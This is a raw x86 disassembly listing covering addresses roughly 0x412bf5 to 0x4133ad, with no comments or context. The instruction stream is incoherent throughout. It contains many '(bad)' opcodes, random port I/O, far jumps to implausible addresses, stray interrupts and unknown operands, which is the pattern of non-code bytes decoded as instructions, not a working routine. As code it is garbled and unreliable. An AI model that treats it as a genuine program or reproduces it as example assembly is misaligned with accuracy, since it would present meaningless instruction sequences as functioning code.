  412bf5:	loop   0x412c19
  412bf7:	enter  0xac50,0x45
  412bfb:	loop   0x412bf5
  412bfd:	and    al,0x78
  412bff:	les    ebx,FWORD PTR [esi+0x6025b33c]
  412c05:	fwait
  412c06:	retf   0x77c9
  412c09:	mov    al,0xa3
  412c0b:	mov    dl,0x7c
  412c0d:	push   esp
  412c0e:	inc    edi
  412c0f:	mov    ebp,DWORD PTR es:[esi+0x27adfcc4]
  412c16:	scas   eax,DWORD PTR es:[edi]
  412c17:	outs   dx,BYTE PTR ds:[esi]
  412c18:	pop    eax
  412c19:	out    dx,eax
  412c1a:	xor    edx,ecx
  412c1c:	lds    edi,FWORD PTR [edx-0xb]
  412c1f:	rcr    BYTE PTR [edi],1
  412c21:	xchg   DWORD PTR [eax+ebx*8-0x70],ecx
  412c25:	or     eax,0x8d080121
  412c2a:	sub    al,0x8c
  412c2c:	aas    
  412c2d:	jmp    0x9f47d383
  412c32:	mov    esi,0xd19f5f5f
  412c37:	sar    DWORD PTR [edx-0x5a41a3ef],1
  412c3d:	sub    al,0x63
  412c3f:	and    dh,al
  412c41:	add    edi,esp
  412c43:	mov    ebx,0x4e155376
  412c48:	rol    BYTE PTR [ecx+0x53],0x6
  412c4c:	and    dh,0x11
  412c4f:	jmp    0x38e4748f
  412c54:	cmc    
  412c55:	cld    
  412c56:	sahf   
  412c57:	sub    BYTE PTR [ebx],dh
  412c59:	imul   ebx,DWORD PTR [ebp-0x3c],0x3
  412c5d:	out    dx,eax
  412c5e:	ret    0x8ecf
  412c61:	sbb    al,0x29
  412c63:	and    eax,0x62762fcf
  412c68:	dec    esi
  412c69:	add    esp,ebp
  412c6b:	imul   BYTE PTR [edi]
  412c6d:	test   DWORD PTR [eax-0x60],ecx
  412c70:	scas   al,BYTE PTR es:[edi]
  412c71:	sub    DWORD PTR [ecx+eiz*4+0x3a],edi
  412c75:	fwait
  412c76:	stos   BYTE PTR es:[edi],al
  412c77:	iret   
  412c78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c79:	xchg   esi,eax
  412c7a:	nop
  412c7b:	and    al,0x5d
  412c7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c7e:	ins    DWORD PTR es:[edi],dx
  412c7f:	and    DWORD PTR [edi],eax
  412c81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c82:	lods   al,BYTE PTR ds:[esi]
  412c83:	ror    BYTE PTR [ecx],0xbe
  412c86:	test   DWORD PTR ss:[eax+eiz*1-0x7407ca8],ebx
  412c8e:	out    0xe0,al
  412c90:	outs   dx,BYTE PTR ds:[esi]
  412c91:	imul   ecx,ebp,0x3304057b
  412c97:	dec    ecx
  412c98:	ret    
  412c99:	cmc    
  412c9a:	inc    ecx
  412c9b:	mov    esp,0x8b335bdb
  412ca0:	jns    0x412c6f
  412ca2:	pop    eax
  412ca3:	imul   ebx,DWORD PTR [edx],0xfffffffc
  412ca6:	imul   esp,DWORD PTR [edx],0x2d
  412ca9:	cdq    
  412caa:	mov    ebx,0x9c13ef96
  412caf:	mov    bh,0x18
  412cb1:	and    esp,DWORD PTR ds:0xb1ebd0ea
  412cb7:	push   esi
  412cb8:	out    0x76,eax
  412cba:	int    0x9c
  412cbc:	mov    edi,0xcc4b84e6
  412cc1:	cmp    eax,0xbf9e8f89
  412cc6:	dec    esi
  412cc7:	xor    edx,edx
  412cc9:	pop    ebx
  412cca:	aaa    
  412ccb:	aam    0x41
  412ccd:	and    al,0x63
  412ccf:	outs   dx,DWORD PTR ds:[esi]
  412cd0:	add    bl,BYTE PTR [ebx]
  412cd2:	or     cl,bh
  412cd4:	call   0x8fe6bab9
  412cd9:	mov    bh,0xc
  412cdb:	and    eax,0x3096b7ab
  412ce0:	dec    ecx
  412ce1:	inc    ebp
  412ce2:	xchg   edi,eax
  412ce3:	xor    dl,BYTE PTR [esi-0x41c7062a]
  412ce9:	mov    ch,0x47
  412ceb:	xchg   edx,eax
  412cec:	fcomp  QWORD PTR [ecx+0x3e]
  412cef:	in     al,0x1a
  412cf1:	(bad)  
  412cf2:	(bad)  
  412cf3:	scas   al,BYTE PTR es:[edi]
  412cf4:	pusha  
  412cf5:	dec    edi
  412cf6:	(bad)  
  412cf7:	(bad)  
  412cf8:	loop   0x412c93
  412cfa:	rcr    dl,cl
  412cfc:	fdivr  DWORD PTR [esi+0xd]
  412cff:	jb     0x412d23
  412d01:	and    eax,0x59b22716
  412d06:	(bad)  
  412d07:	shl    BYTE PTR [edi+0x4a],cl
  412d0a:	mov    ebp,0xb62fc1c3
  412d0f:	mov    ecx,0x368fb393
  412d14:	test   DWORD PTR ds:0x67003ca7,eax
  412d1a:	jb     0x412d48
  412d1c:	sbb    edi,ecx
  412d1e:	sbb    al,0xee
  412d20:	push   cs
  412d21:	push   cs
  412d22:	and    edx,DWORD PTR [edx]
  412d24:	xor    eax,0x27419d39
  412d29:	test   DWORD PTR [esi-0x4d3cf00a],esp
  412d2f:	aam    0x99
  412d31:	out    0x74,eax
  412d33:	out    dx,eax
  412d34:	in     al,dx
  412d35:	gs int3 
  412d37:	inc    ecx
  412d38:	adc    bl,ch
  412d3a:	(bad)  
  412d3b:	mov    bl,0x76
  412d3d:	test   ebx,ecx
  412d3f:	test   DWORD PTR [edi+0x5f],0x34599429
  412d46:	fmul   DWORD PTR [edi+0x4f]
  412d49:	xor    ecx,edx
  412d4b:	(bad)  
  412d4c:	ds cmp al,0x7a
  412d4f:	rol    DWORD PTR [edx-0xa46108e],0xc3
  412d56:	sbb    esp,DWORD PTR [ebp-0x2a]
  412d59:	popa   
  412d5a:	or     BYTE PTR [bp-0x3a95],dh
  412d5f:	iret   
  412d60:	iret   
  412d61:	cmp    DWORD PTR [ebx],ecx
  412d63:	mov    cl,0x32
  412d65:	popaw  
  412d67:	in     eax,dx
  412d68:	call   esi
  412d6a:	mov    ch,al
  412d6c:	loop   0x412dce
  412d6e:	pusha  
  412d6f:	push   ebp
  412d70:	push   esi
  412d71:	jg     0x412d37
  412d73:	idiv   cl
  412d75:	mov    bh,0x84
  412d77:	not    edi
  412d79:	js     0x412db4
  412d7b:	retf   
  412d7c:	imul   eax,DWORD PTR [edi],0x40
  412d7f:	call   0x2c3c:0xd5ad66dd
  412d86:	mov    ecx,0xcf8e5ef
  412d8b:	adc    eax,0x75705465
  412d90:	pop    esp
  412d91:	mov    ecx,DWORD PTR [ebx+0x3d369ce]
  412d97:	add    BYTE PTR [eax],0xfc
  412d9a:	repz push esp
  412d9c:	ins    BYTE PTR es:[edi],dx
  412d9d:	dec    edx
  412d9e:	xchg   DWORD PTR [esi+0x234d33fb],ecx
  412da4:	fwait
  412da5:	inc    esi
  412da6:	sahf   
  412da7:	mov    ds:0x1d7d0404,eax
  412dac:	jb     0x412d70
  412dae:	(bad)  
  412db0:	aam    0x46
  412db2:	jl     0x412da6
  412db4:	push   eax
  412db5:	fs push esp
  412db7:	out    dx,eax
  412db8:	dec    ebx
  412db9:	sub    eax,0x66f3d458
  412dbe:	mov    edx,0x181ed170
  412dc3:	add    ecx,DWORD PTR [ebx-0xa23f2cd]
  412dc9:	adc    eax,0x44388c5b
  412dce:	sub    esp,DWORD PTR fs:[edx]
  412dd1:	pop    eax
  412dd2:	mov    ebx,0x565bd253
  412dd7:	mov    dh,0x6d
  412dd9:	clc    
  412dda:	pushf  
  412ddb:	lahf   
  412ddc:	mov    WORD PTR [ebp-0x2],es
  412ddf:	xchg   ebp,eax
  412de0:	add    al,0xe6
  412de2:	fimul  WORD PTR [ebx+ebx*4+0x70]
  412de6:	add    ecx,0xffffffd1
  412de9:	push   ebp
  412dea:	cmc    
  412deb:	mov    edx,0x326f0bcd
  412df0:	(bad)  
  412df1:	cmp    DWORD PTR ds:0xd47973f4,esp
  412df7:	adc    ah,BYTE PTR [ecx+0x2c]
  412dfa:	aam    0xda
  412dfc:	push   cs
  412dfd:	xor    al,0x94
  412dff:	aas    
  412e00:	mov    edi,0xc65d6abf
  412e05:	leave  
  412e06:	mov    al,fs:0x4d986904
  412e0c:	out    0x61,eax
  412e0e:	into   
  412e0f:	(bad)  
  412e11:	cdq    
  412e12:	iret   
  412e13:	mov    eax,0x9e45411d
  412e18:	(bad)  
  412e19:	out    dx,al
  412e1a:	jae    0x412dbf
  412e1c:	jns    0x412e54
  412e1e:	les    esp,FWORD PTR [ecx+0x74]
  412e21:	stos   DWORD PTR es:[edi],eax
  412e22:	add    al,0x8
  412e24:	fisubr DWORD PTR [edx-0x2d]
  412e27:	imul   ecx,DWORD PTR [ebp+0x33004e59],0xbd77032e
  412e31:	dec    ebp
  412e32:	xchg   ch,ch
  412e34:	mov    ch,0x3d
  412e36:	jne    0x412e37
  412e38:	fs jge 0x412e64
  412e3b:	aad    0x67
  412e3d:	(bad)  
  412e3e:	in     eax,dx
  412e3f:	sbb    DWORD PTR [eax],edi
  412e41:	adc    dh,bh
  412e43:	ss test al,0xbe
  412e46:	pusha  
  412e47:	push   cs
  412e48:	jmp    0xefc25df
  412e4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e4e:	dec    edi
  412e4f:	mov    al,ds:0x4122c82c
  412e54:	ficom  DWORD PTR [ebx-0x32623a24]
  412e5a:	out    0xfb,al
  412e5c:	jno    0x412e94
  412e5e:	jecxz  0x412ea7
  412e60:	add    al,BYTE PTR [esi+0x579a205f]
  412e66:	xchg   edi,eax
  412e67:	jp     0x412ecd
  412e69:	rcl    DWORD PTR [bp-0x87d],cl
  412e6e:	out    0xae,eax
  412e70:	push   eax
  412e71:	test   eax,ebp
  412e73:	outs   dx,BYTE PTR ds:[esi]
  412e74:	xlat   BYTE PTR ds:[ebx]
  412e75:	xchg   ebp,eax
  412e76:	xor    edi,DWORD PTR [esi-0x7b]
  412e79:	mov    edx,0x518622a1
  412e7e:	pop    ss
  412e7f:	mov    ecx,0x432a09af
  412e84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e85:	lods   eax,DWORD PTR ds:[esi]
  412e86:	inc    esi
  412e87:	sub    BYTE PTR [eax],0xaf
  412e8a:	js     0x412eb4
  412e8c:	jle    0x412e83
  412e8e:	mov    bl,0x79
  412e90:	push   ds
  412e91:	cmp    DWORD PTR [eax],ebx
  412e93:	fs push esi
  412e95:	(bad)  
  412e96:	pop    esi
  412e97:	pop    edx
  412e98:	imul   esi,esi,0xffffffee
  412e9b:	inc    ebp
  412e9c:	stos   BYTE PTR es:[edi],al
  412e9d:	jno    0xd174b495
  412ea3:	adc    cl,cl
  412ea5:	pop    edx
  412ea6:	mov    es,WORD PTR [eax-0x13]
  412ea9:	test   eax,0xf8fea3c0
  412eae:	sub    ebx,DWORD PTR [ebp-0x22bd7a23]
  412eb4:	in     al,0x2f
  412eb6:	jae    0x412f06
  412eb8:	pop    edi
  412eb9:	sub    esp,DWORD PTR [ebp-0x445a0291]
  412ebf:	data16 sub cl,al
  412ec2:	std    
  412ec3:	fidiv  WORD PTR [edi]
  412ec5:	cmp    eax,0x70a85405
  412eca:	add    ebx,esp
  412ecc:	lea    edi,[edx+0x48]
  412ecf:	xchg   edi,eax
  412ed0:	dec    edi
  412ed1:	arpl   WORD PTR ds:0x2d24dd4,sp
  412ed7:	inc    ebx
  412ed8:	test   BYTE PTR [ebx],dl
  412eda:	sub    BYTE PTR [ebx+0x2dc8ddb5],bl
  412ee0:	mov    al,0x8
  412ee2:	jmp    0x48a9ee59
  412ee7:	daa    
  412ee8:	and    dl,bh
  412eea:	add    esp,DWORD PTR [eax-0x81a7502]
  412ef0:	mov    ds:0xd1422554,al
  412ef5:	in     al,dx
  412ef6:	pop    ds
  412ef7:	repnz and cl,BYTE PTR ds:0xfe4a508f
  412efe:	iret   
  412eff:	xor    al,0xd5
  412f01:	mov    esi,0x1f889d33
  412f06:	push   ebp
  412f07:	(bad)  
  412f08:	fcom   DWORD PTR [eax]
  412f0a:	ror    BYTE PTR [edi],0x22
  412f0d:	sbb    eax,0xe340243
  412f12:	dec    eax
  412f13:	in     eax,dx
  412f14:	iret   
  412f15:	aas    
  412f16:	mov    ch,0xb7
  412f18:	test   al,0xbe
  412f1a:	stos   BYTE PTR es:[edi],al
  412f1b:	lock inc eax
  412f1d:	outs   dx,BYTE PTR ds:[esi]
  412f1e:	popf   
  412f1f:	clc    
  412f20:	in     eax,dx
  412f21:	xor    eax,esi
  412f23:	bound  eax,QWORD PTR [ecx]
  412f25:	jne    0x412f32
  412f27:	or     eax,edx
  412f29:	jbe    0x412f49
  412f2b:	rol    DWORD PTR [ebx-0x55],1
  412f2e:	(bad)  
  412f2f:	into   
  412f30:	pop    ecx
  412f31:	lea    esi,[edx-0x70]
  412f34:	in     eax,0xd1
  412f36:	fidivr WORD PTR [edi-0x32]
  412f39:	mov    esi,0x9f69a3f1
  412f3e:	lods   al,BYTE PTR ds:[esi]
  412f3f:	add    al,0xc0
  412f41:	jb     0x412f8c
  412f43:	pop    edx
  412f44:	xchg   ebp,eax
  412f45:	xor    bh,BYTE PTR [edi-0x134d51ee]
  412f4b:	dec    DWORD PTR [ebp-0x13b8e8a4]
  412f51:	(bad)  
  412f53:	jp     0x412efa
  412f55:	jle    0x412f4f
  412f57:	jb     0x412fc8
  412f59:	rcr    BYTE PTR [esi+0x6c],cl
  412f5c:	and    al,0x44
  412f5e:	mov    ch,0x45
  412f60:	fwait
  412f61:	or     ch,BYTE PTR ss:[esi-0x61b9b86a]
  412f68:	inc    edx
  412f69:	(bad)
  412f6c:	and    BYTE PTR [ebx],ch
  412f6e:	aam    0x9a
  412f70:	cmp    BYTE PTR [ecx+0x2d],bl
  412f73:	sbb    ebp,DWORD PTR [edi+0x54e47915]
  412f79:	and    ah,dh
  412f7b:	xor    ebx,DWORD PTR [edx-0x25]
  412f7e:	mov    dl,0x46
  412f80:	or     al,0x76
  412f82:	sub    al,0x76
  412f84:	dec    edx
  412f85:	mov    ah,0xd6
  412f87:	xchg   esp,eax
  412f88:	push   esi
  412f89:	xchg   ebx,esi
  412f8b:	sub    al,0xa7
  412f8d:	lahf   
  412f8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f8f:	push   ebp
  412f90:	dec    esp
  412f91:	mov    ah,0xc3
  412f93:	inc    ebx
  412f94:	sbb    eax,0x261d6902
  412f99:	push   ebx
  412f9a:	sar    BYTE PTR [edx-0x7127280d],cl
  412fa0:	lea    ebp,[edx-0x68037878]
  412fa6:	sub    eax,DWORD PTR [eax-0x51645dc8]
  412fac:	pop    ebx
  412fad:	sahf   
  412fae:	inc    edi
  412faf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fb0:	sbb    DWORD PTR [edi],esp
  412fb2:	jnp    0x412f5f
  412fb4:	mov    eax,0x538c0588
  412fb9:	popf   
  412fba:	jno    0x412f75
  412fbc:	popa   
  412fbd:	ret    0x7edd
  412fc0:	mov    ah,0xfd
  412fc2:	aam    0x93
  412fc4:	(bad)  
  412fc5:	enter  0x7457,0xdb
  412fc9:	sti    
  412fca:	std    
  412fcb:	test   DWORD PTR [esi+0x5cebebb4],ecx
  412fd1:	sbb    esi,ebp
  412fd3:	je     0x412f94
  412fd5:	adc    edx,DWORD PTR [edi+0x56]
  412fd8:	or     al,0xed
  412fda:	or     edi,DWORD PTR [eax+0x3c]
  412fdd:	cmp    cl,BYTE PTR [edx-0x266f47e0]
  412fe3:	out    0xae,al
  412fe5:	mov    ebx,0xf937158a
  412fea:	add    ecx,edx
  412fec:	xchg   esp,eax
  412fed:	retf   0x6263
  412ff0:	sub    ch,bh
  412ff2:	pushf  
  412ff3:	xor    al,ah
  412ff5:	xchg   ebx,eax
  412ff6:	lea    ecx,[ebx+0x1447d6a8]
  412ffc:	mov    eax,ds:0x2af0ef2f
  413001:	xchg   esi,eax
  413002:	jno    0x412fea
  413004:	and    esp,DWORD PTR [esi]
  413006:	mov    DWORD PTR [ecx+ebp*1+0x52],ebp
  41300a:	pop    ecx
  41300b:	inc    esi
  41300c:	enter  0x1ca8,0x2d
  413010:	and    DWORD PTR [eax],ebx
  413012:	push   cs
  413013:	or     eax,0x27633d0b
  413018:	inc    esp
  413019:	clc    
  41301a:	adc    bl,BYTE PTR [eax-0x7d]
  41301d:	add    al,0xc9
  41301f:	hlt    
  413020:	hlt    
  413021:	mov    eax,ds:0xa9d25b1
  413026:	jl     0x413076
  413028:	out    dx,al
  413029:	shl    DWORD PTR [ebx+0x46f51b94],cl
  41302f:	mov    bh,0x5d
  413031:	dec    edi
  413032:	jg     0x413088
  413034:	push   ebp
  413035:	fst    DWORD PTR [edi-0x79e1d818]
  41303b:	inc    edi
  41303c:	mov    ds:0x1eb3db95,al
  413041:	mov    eax,edx
  413043:	test   DWORD PTR [edi+0x6],ebx
  413046:	loop   0x41304d
  413048:	pop    edx
  413049:	mov    eax,0xd6ed062e
  41304e:	pop    es
  41304f:	mov    al,ds:0x2d496cb6
  413054:	in     eax,0xce
  413056:	mov    bl,0x6
  413058:	fist   WORD PTR [esi+0x5aa9134c]
  41305e:	xor    dl,cl
  413060:	mov    edx,0x10e990c1
  413065:	pop    ebp
  413066:	clc    
  413067:	fistp  WORD PTR ds:0x8a6737ab
  41306d:	loope  0x413018
  41306f:	cld    
  413070:	mov    bl,0x2c
  413072:	bswap  eax
  413074:	out    0xc5,al
  413076:	(bad)  
  413077:	into   
  413078:	loop   0x413087
  41307a:	pop    eax
  41307b:	or     al,0x2e
  41307d:	mov    WORD PTR [esi],?
  41307f:	xchg   DWORD PTR [eax-0x6e],ecx
  413082:	cmp    al,0x44
  413084:	stc    
  413085:	pop    esp
  413086:	mov    dh,0xb2
  413088:	add    eax,0x69e0c0ec
  41308d:	mov    ch,BYTE PTR [ebx+edx*2-0x60]
  413091:	dec    ebx
  413092:	out    dx,al
  413093:	xchg   ecx,eax
  413094:	mov    eax,0x66d2902b
  413099:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41309a:	or     edi,DWORD PTR [ecx+0x3]
  41309d:	mov    ecx,0x20404dc5
  4130a2:	stos   DWORD PTR es:[edi],eax
  4130a3:	into   
  4130a4:	push   edi
  4130a5:	pop    eax
  4130a6:	mov    cl,0xaa
  4130a8:	sar    DWORD PTR [ebp+esi*2-0x86e59e],0xbe
  4130b0:	jo     0x41307e
  4130b2:	add    BYTE PTR [ebp-0x57],cl
  4130b5:	xchg   ebp,eax
  4130b6:	push   0x7adc9939
  4130bb:	shl    DWORD PTR [ebx],cl
  4130bd:	pop    esp
  4130be:	adc    edx,DWORD PTR [eax]
  4130c0:	inc    esi
  4130c1:	popa   
  4130c2:	dec    esi
  4130c3:	sub    BYTE PTR [edi+ecx*8],ch
  4130c6:	push   es
  4130c7:	push   esp
  4130c8:	sbb    DWORD PTR [esi+eiz*8-0x71],0xb722758d
  4130d0:	icebp  
  4130d1:	push   0x318cc22e
  4130d6:	and    ecx,ebp
  4130d8:	test   eax,0xf9d68053
  4130dd:	mov    esi,0x3bbede1e
  4130e2:	adc    eax,0x14853957
  4130e7:	inc    ebp
  4130e8:	push   edi
  4130e9:	test   BYTE PTR [eax],dh
  4130eb:	adc    al,0xde
  4130ed:	gs dec ecx
  4130ef:	push   es
  4130f0:	ss (bad) 
  4130f2:	pop    esp
  4130f3:	int3   
  4130f4:	push   cs
  4130f5:	iret   
  4130f6:	push   eax
  4130f7:	hlt    
  4130f8:	test   eax,0x349b9ca9
  4130fd:	nop
  4130fe:	ins    DWORD PTR es:[edi],dx
  4130ff:	shl    DWORD PTR [ecx+0x7a2da572],1
  413105:	mov    cl,0x79
  413107:	push   esp
  413108:	or     al,0xbe
  41310a:	push   esp
  41310b:	and    edi,eax
  41310d:	mov    ebx,0x3b3b260a
  413112:	pop    esi
  413113:	xor    ch,BYTE PTR [ebx+edx*8]
  413116:	add    BYTE PTR [edx+0x1d],0xcb
  41311a:	adc    cl,BYTE PTR [edi+0x10]
  41311d:	inc    edx
  41311e:	fcom   st(6)
  413120:	fild   WORD PTR [ecx]
  413122:	sbb    al,0x19
  413124:	add    dl,cl
  413126:	mov    edi,0x2c3eeaa1
  41312b:	ins    BYTE PTR es:[edi],dx
  41312c:	jmp    0xdf05db96
  413131:	xchg   esi,eax
  413132:	call   0x7e9d6cac
  413137:	sbb    edx,DWORD PTR [edx-0x1ee8b0cb]
  41313d:	xor    al,0xdb
  41313f:	add    eax,0x431db309
  413144:	mov    ?,WORD PTR [ebp*2+0x3db68108]
  41314b:	arpl   WORD PTR [edx],ax
  41314d:	fwait
  41314e:	enter  0xfaa1,0x1f
  413152:	fld    QWORD PTR [esi]
  413154:	jle    0x4131af
  413156:	pop    es
  413157:	mov    cl,cl
  413159:	inc    edi
  41315a:	gs icebp 
  41315c:	pop    ebx
  41315d:	sub    bh,BYTE PTR [edi+eax*2+0x70]
  413161:	mov    al,ds:0xd682472e
  413166:	dec    esp
  413167:	lds    esp,FWORD PTR [edx+0x5e]
  41316a:	loope  0x41313f
  41316c:	mov    ebp,0x71db9dc2
  413171:	xchg   edx,eax
  413172:	hlt    
  413173:	xchg   DWORD PTR [ecx-0x43],edx
  413176:	push   ecx
  413177:	sbb    DWORD PTR [ebp-0x1a],0x5a
  41317b:	cmp    ebx,DWORD PTR [edx-0x49]
  41317e:	fwait
  41317f:	outs   dx,BYTE PTR ds:[esi]
  413180:	(bad)  
  413181:	xchg   esi,eax
  413182:	ret    0xf1d3
  413185:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413186:	addr16 xor al,0x8e
  413189:	out    0xa7,al
  41318b:	inc    edx
  41318c:	add    BYTE PTR [eax-0x3],0xc1
  413190:	mov    WORD PTR ds:0x370b4fbb,gs
  413196:	mov    ah,0xe3
  413198:	cdq    
  413199:	retf   0xcedc
  41319c:	outs   dx,DWORD PTR ds:[esi]
  41319d:	xlat   BYTE PTR ds:[ebx]
  41319e:	cmp    al,0xe1
  4131a0:	sahf   
  4131a1:	push   0x3ec1e074
  4131a6:	dec    edi
  4131a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131a8:	cmp    BYTE PTR [edx-0x1d0edc0c],bl
  4131ae:	cdq    
  4131af:	popa   
  4131b0:	imul   edi,DWORD PTR [ecx+eax*1],0x1b5e106f
  4131b7:	clc    
  4131b8:	sub    edx,DWORD PTR [edi-0x78]
  4131bb:	loop   0x413141
  4131bd:	in     al,dx
  4131be:	dec    edi
  4131bf:	std    
  4131c0:	fs (bad) 
  4131c2:	dec    esp
  4131c3:	(bad)  
  4131c4:	daa    
  4131c5:	mov    bh,BYTE PTR [eax+ecx*8+0x5ecc3645]
  4131cc:	cmp    BYTE PTR [ebx+eax*2],bl
  4131cf:	fsubr  DWORD PTR [eax]
  4131d1:	sub    eax,DWORD PTR [ebp-0x4f]
  4131d4:	ror    DWORD PTR [esi],0x23
  4131d7:	pop    esi
  4131d8:	lock call 0xab4c:0x1b520546
  4131e0:	lock out 0x17,al
  4131e3:	retf   
  4131e4:	dec    esp
  4131e5:	pop    ebx
  4131e6:	pop    esp
  4131e7:	pushf  
  4131e8:	jbe    0x413266
  4131ea:	int    0xf2
  4131ec:	(bad)  
  4131ed:	int    0xed
  4131ef:	jle    0x413191
  4131f1:	pop    esi
  4131f2:	jmp    0x642f:0x30666a36
  4131f9:	rol    BYTE PTR [ecx],cl
  4131fb:	aas    
  4131fc:	jae    0x41322c
  4131fe:	rcl    esi,0x4d
  413201:	adc    DWORD PTR [edi-0x150049c9],ebp
  413207:	lods   eax,DWORD PTR ds:[esi]
  413208:	and    al,BYTE PTR [ecx]
  41320a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41320b:	lods   al,BYTE PTR ds:[esi]
  41320c:	shl    DWORD PTR [ecx+0x100ff427],0x1
  413213:	in     eax,0x57
  413215:	aad    0xf5
  413217:	mov    al,0xd3
  413219:	dec    edx
  41321a:	sub    ebx,DWORD PTR [ecx]
  41321c:	add    al,0xec
  41321e:	stc    
  41321f:	repnz xor eax,0xf8686bc7
  413225:	clc    
  413226:	xor    DWORD PTR [ecx+0x509f2314],edx
  41322c:	loope  0x413275
  41322e:	(bad)  
  41322f:	mov    ebx,0x48f2c350
  413234:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413235:	xchg   ebp,eax
  413236:	cmp    cl,bl
  413238:	push   edi
  413239:	inc    esi
  41323a:	je     0x4131e3
  41323c:	fwait
  41323d:	cdq    
  41323e:	(bad)  
  41323f:	adc    dh,BYTE PTR [ebp+0x38d04d96]
  413245:	lahf   
  413246:	jno    0x4132b2
  413248:	push   esi
  413249:	(bad)  
  41324a:	mov    dl,dh
  41324c:	mov    di,sp
  41324f:	pop    ds
  413250:	pop    edx
  413251:	or     DWORD PTR [ebp+0x1d],ebp
  413254:	aad    0x73
  413256:	xchg   ebx,eax
  413257:	outs   dx,DWORD PTR ds:[esi]
  413258:	das    
  413259:	mov    gs,WORD PTR [edi+edx*1+0x66]
  41325d:	push   ecx
  41325e:	and    eax,DWORD PTR [esi]
  413260:	hlt    
  413261:	jmp    0x1f6097da
  413266:	in     eax,dx
  413267:	and    BYTE PTR ds:0x7e1fec28,cl
  41326d:	pusha  
  41326e:	int    0x8e
  413270:	iret   
  413271:	cmp    dl,BYTE PTR [edx+0x2e]
  413274:	jmp    0x4132ab
  413276:	jp     0x413263
  413278:	imul   esp,DWORD PTR [ebp+0x78061e09],0x69
  41327f:	test   bh,bl
  413281:	pop    esi
  413282:	std    
  413283:	pop    edi
  413284:	sbb    ebp,DWORD PTR [edx]
  413286:	push   edx
  413287:	stc    
  413288:	in     al,0x8
  41328a:	mov    ebx,0xa7c29315
  41328f:	ds or  ebx,ebx
  413292:	inc    ebp
  413293:	das    
  413294:	cmp    eax,0xbf85250b
  413299:	adc    BYTE PTR [edx-0x7b],dh
  41329c:	add    dl,BYTE PTR [edi-0x60]
  41329f:	ds cmp eax,0x6572a3c4
  4132a5:	adc    DWORD PTR [edi],edi
  4132a7:	bound  edx,QWORD PTR [edi]
  4132a9:	push   ebp
  4132aa:	(bad)  
  4132ab:	aas    
  4132ac:	dec    eax
  4132ad:	sub    DWORD PTR [esi-0x722f2fed],eax
  4132b3:	jbe    0x41326a
  4132b5:	mov    cl,0x2a
  4132b7:	add    eax,0xdc91f0d6
  4132bc:	or     BYTE PTR [edx+0x27e7f39],al
  4132c2:	sar    BYTE PTR [edx],0x28
  4132c5:	retf   
  4132c6:	(bad)  
  4132c7:	into   
  4132c8:	rcl    DWORD PTR [ebp+eax*2+0x5a],0xd5
  4132cd:	rcl    BYTE PTR [edi-0x4001ac20],1
  4132d3:	leave  
  4132d4:	xchg   ch,dh
  4132d6:	retf   0x2b04
  4132d9:	adc    bh,BYTE PTR [eax-0x4015cdfb]
  4132df:	dec    edx
  4132e0:	pop    ecx
  4132e1:	adc    al,0xfe
  4132e3:	mov    ds:0x348e493b,al
  4132e8:	test   BYTE PTR [ebx+0x19],cl
  4132eb:	imul   edx,DWORD PTR [eax-0x104e09be],0xbf90ef7e
  4132f5:	sbb    eax,0x170fcda1
  4132fa:	test   BYTE PTR [edi-0x3345f85e],cl
  413300:	out    dx,al
  413301:	adc    eax,0xf98746f5
  413306:	std    
  413307:	adc    BYTE PTR [ebp+0x45],al
  41330a:	ret    
  41330b:	hlt    
  41330c:	enter  0xe59f,0xf6
  413310:	lahf   
  413311:	xor    dl,BYTE PTR [eax+0x4fb5aab5]
  413317:	das    
  413318:	nop
  413319:	push   es
  41331a:	in     al,0x80
  41331c:	test   eax,0x14a195ae
  413321:	ja     0x413370
  413323:	aam    0xa0
  413325:	sub    al,0xef
  413327:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413328:	jecxz  0x4133a7
  41332a:	add    eax,0xee3a72c9
  41332f:	pop    ecx
  413330:	in     al,dx
  413331:	pop    esi
  413332:	pop    ds
  413333:	shr    DWORD PTR [esi-0x5ba5c608],0xfc
  41333a:	ds (bad) 
  41333c:	(bad)  [ecx-0xc6148ef]
  413342:	and    edi,DWORD PTR [edi+0x23]
  413345:	rol    DWORD PTR [edx-0x21],cl
  413348:	xchg   ebx,eax
  413349:	aas    
  41334a:	jne    0x413323
  41334c:	xor    edi,DWORD PTR [ebx+0x412e6bf3]
  413352:	xchg   DWORD PTR [eax+0x75],ebp
  413355:	lds    ecx,FWORD PTR [esi]
  413357:	cld    
  413358:	xor    dl,ch
  41335a:	pusha  
  41335b:	push   eax
  41335c:	dec    esp
  41335d:	sbb    esi,DWORD PTR [edx+0x72d132e9]
  413363:	ds and eax,0x8604096b
  413369:	aas    
  41336a:	xor    esi,DWORD PTR [edx-0x76]
  41336d:	inc    ebx
  41336e:	sbb    al,0xdb
  413370:	shl    bl,1
  413372:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413373:	push   esp
  413374:	jns    0x4132fa
  413376:	ss jno 0x4133d0
  413379:	in     al,0x1f
  41337b:	ror    BYTE PTR [edi+0x42],cl
  41337e:	xchg   edx,eax
  41337f:	sti    
  413380:	lods   al,BYTE PTR ds:[esi]
  413381:	shl    DWORD PTR [ebp-0x46bd1fcb],1
  413387:	imul   edx,DWORD PTR [ecx-0x1b],0x47644fe2
  41338e:	xchg   edx,eax
  41338f:	sbb    dh,BYTE PTR [ecx+ebp*8+0x1df22732]
  413396:	dec    esp
  413397:	push   0xffffffc2
  413399:	nop
  41339a:	sbb    DWORD PTR [esi-0x4bd1bd81],ecx
  4133a0:	cmp    BYTE PTR [ecx-0x163cf25],0x72
  4133a7:	into   
  4133a8:	push   0xffffff8b
  4133aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133ab:	jb     0x4133ba
  4133ad:	push   ss
